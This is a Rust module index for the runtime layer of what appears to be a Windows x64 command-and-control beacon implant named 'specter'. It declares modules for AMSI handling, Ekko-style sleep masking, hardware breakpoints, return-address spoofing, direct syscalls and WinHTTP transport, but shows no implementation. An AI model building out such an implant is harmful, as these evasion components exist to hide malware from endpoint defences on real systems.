//! Runtime layer (port of `src_beacon/src/runtime/`): bootstrap, TEB
//! instance access, custom heap, sleep obfuscation plumbing. Pure logic
//! (hashing, wire, structures) lives in the `specter-core` crate so it is
//! testable on the host; this module holds only the Windows x64 glue.
//!
//! Phase 1 of the roadmap (docs/ETUDE-DE-FAISABILITE.md, section 8).

pub mod amsi;
pub mod bootstrap;
pub mod debug;
pub mod ekko;
pub mod hwbp;
pub mod retspoof;
pub mod sleepmask;
pub mod stack;
pub mod syscalls;
pub mod sysinfo;
pub mod winhttp;
